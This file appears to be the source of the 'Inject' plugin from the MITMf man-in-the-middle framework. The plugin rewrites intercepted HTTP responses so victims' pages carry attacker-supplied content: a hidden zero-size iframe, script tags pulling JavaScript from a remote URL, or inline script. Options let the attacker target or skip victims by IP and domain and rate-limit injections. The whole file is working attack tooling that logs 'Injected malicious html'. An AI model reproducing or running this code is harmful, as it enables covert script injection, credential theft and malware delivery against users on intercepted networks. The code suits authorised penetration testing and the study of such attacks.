# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import time
import re
import sys
import argparse

from plugins.plugin import Plugin

class Inject(Plugin):
    name       = "Inject"
    optname    = "inject"
    desc       = "Inject arbitrary content into HTML content"
    version    = "0.4"

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options       = options
        self.ip            = options.ip

        self.html_url      = options.html_url
        self.html_payload  = options.html_payload
        self.html_file     = options.html_file
        self.js_url        = options.js_url
        self.js_payload    = options.js_payload
        self.js_file       = options.js_file

        self.rate_limit    = options.rate_limit
        self.count_limit   = options.count_limit
        self.per_domain    = options.per_domain
        self.black_ips     = options.black_ips.split(',')
        self.white_ips     = options.white_ips.split(',')
        self.white_domains = options.white_domains.split(',')
        self.black_domains = options.black_domains.split(',')
        self.match_str     = options.match_str
        
        self.ctable        = {}
        self.dtable        = {}
        self.count         = 0
        self.mime          = "text/html"

    def response(self, response, request, data):
        ip, hn, mime = self._get_req_info(response)
        if self._should_inject(ip, hn, mime) and self._ip_filter(ip) and self._host_filter(hn) and (hn not in self.ip):
            if (not self.js_url == self.html_url is not None or not self.html_payload == ""):
                data = self._insert_html(data, post=[(self.match_str, self.get_payload())])
                self.ctable[ip] = time.time()
                self.dtable[ip+hn] = True
                self.count += 1
                self.clientlog.info("Injected malicious html: {}".format(hn), extra=request.clientInfo)

        return {'response': response, 'request':request, 'data': data}

    def get_payload(self):
        payload = ''

        if self.html_url is not None:
            payload += '<iframe src="{}" height=0%% width=0%%></iframe>'.format(self.html_url)

        if self.html_payload is not None:
            payload += self.html_payload

        if self.html_file:
            payload += self.html_file.read()

        if self.js_url is not None:
            payload += '<script type="text/javascript" src="{}"></script>'.format(self.js_url)

        if self.js_payload is not None:
            payload += '<script type="text/javascript">{}</script>'.format(self.js_payload)

        if self.js_file:
            payload += '<script type="text/javascript">{}</script>'.format(self.js_file.read())

        return payload

    def _ip_filter(self, ip):

        if self.white_ips[0] != '':
            if ip in self.white_ips:
                return True
            else:
                return False

        if self.black_ips[0] != '':
            if ip in self.black_ips:
                return False
            else:
                return True

        return True

    def _host_filter(self, host):

        if self.white_domains[0] != '':
            if host in self.white_domains:
                return True
            else:
                return False

        if self.black_domains[0] != '':
            if host in self.black_domains:
                return False
            else:
                return True

        return True


    def _should_inject(self, ip, hn, mime):

        if self.count_limit == self.rate_limit is None and not self.per_domain:
            return True

        if self.count_limit is not None and self.count > self.count_limit:
            return False

        if self.rate_limit is not None:
            if ip in self.ctable and time.time()-self.ctable[ip] < self.rate_limit:
                return False

        if self.per_domain:
            return not ip+hn in self.dtable

        return mime.find(self.mime) != -1

    def _get_req_info(self, response):
        ip = response.getClientIP()
        hn = response.getRequestHostname()
        mime = response.headers['Content-Type']
        return (ip, hn, mime)

    def _insert_html(self, data, pre=[], post=[], re_flags=re.I):
        '''
        To use this function, simply pass a list of tuples of the form:
        
        (string/regex_to_match,html_to_inject)
        
        NOTE: Matching will be case insensitive unless differnt flags are given
        
        The pre array will have the match in front of your injected code, the post
        will put the match behind it.
        '''
        pre_regexes = [re.compile(r"(?P<match>"+i[0]+")", re_flags) for i in pre]
        post_regexes = [re.compile(r"(?P<match>"+i[0]+")", re_flags) for i in post]

        for i, r in enumerate(pre_regexes):
            data = re.sub(r, "\g<match>"+pre[i][1], data)

        for i, r in enumerate(post_regexes):
            data = re.sub(r, post[i][1]+"\g<match>", data)

        return data

    def options(self, options):
        options.add_argument("--js-url", type=str, help="URL of the JS to inject")
        options.add_argument('--js-payload', type=str, help='JS string to inject')
        options.add_argument('--js-file', type=argparse.FileType('r'), help='File containing JS to inject')
        options.add_argument("--html-url", type=str, help="URL of the HTML to inject")
        options.add_argument("--html-payload", type=str, help="HTML string to inject")
        options.add_argument('--html-file', type=argparse.FileType('r'), help='File containing HTML to inject')
        options.add_argument("--match-str", type=str, default='</body>', help="String you would like to match and place your payload before. (</body> by default)")
        
        group = options.add_mutually_exclusive_group(required=False)
        group.add_argument("--per-domain", action="store_true", help="Inject once per domain per client.")
        group.add_argument("--rate-limit", type=float, help="Inject once every RATE_LIMIT seconds per client.")
        group.add_argument("--count-limit", type=int, help="Inject only COUNT_LIMIT times per client.")
        group.add_argument("--white-ips", metavar='IP', default='', type=str, help="Inject content ONLY for these ips (comma seperated)")
        group.add_argument("--black-ips", metavar='IP', default='', type=str, help="DO NOT inject content for these ips (comma seperated)")
        group.add_argument("--white-domains", metavar='DOMAINS', default='', type=str, help="Inject content ONLY for these domains (comma seperated)")
        group.add_argument("--black-domains", metavar='DOMAINS', default='', type=str, help="DO NOT inject content for these domains (comma seperated)")
